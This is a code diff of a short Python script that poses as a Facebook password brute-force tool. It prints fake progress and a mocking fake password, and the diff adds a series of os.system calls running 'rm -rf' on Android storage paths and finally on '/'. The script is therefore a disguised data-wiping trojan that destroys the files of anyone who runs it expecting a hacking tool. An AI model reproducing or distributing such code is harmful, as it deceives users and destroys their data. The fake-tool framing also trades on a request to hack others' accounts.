@@ -1,3 +1,6 @@
+import datetime
+now = datetime.datetime.now()
+print(now)
 print("FACEBOOOK BRUTEFORCE")
 name = input("Target Link:")
 print(name)
@@ -20,11 +23,14 @@ print("100%")
 print("succesfully hacked")
 print("password:fuckyouu_skid")
 
-import datetime
-
-now = datetime.datetime.now()
-print(now)
-
+import os
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
 
 
 
